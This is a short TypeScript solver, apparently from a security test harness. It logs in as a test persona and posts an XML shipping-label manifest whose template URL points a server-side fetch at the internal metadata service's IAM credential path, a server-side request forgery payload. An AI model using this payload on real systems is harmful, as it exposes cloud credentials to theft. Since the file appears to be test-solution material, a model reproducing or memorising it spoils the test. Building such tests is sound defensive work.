// Post a shipping-label manifest whose template URL points the server-side fetch at the internal
// metadata origin.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'
import { METADATA_ORIGIN } from '../../src/internal-services.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const manifest =
    '<?xml version="1.0"?>\n' +
    '<manifest><label><carrier>demo</carrier>' +
    `<template>${METADATA_ORIGIN}/latest/meta-data/iam/</template>` +
    '</label></manifest>'
  await ctx.fetch(buildPath(ctx.plan, 'importShippingLabel'), {
    method: 'POST',
    headers: { 'content-type': 'application/xml' },
    body: manifest,
  })
}
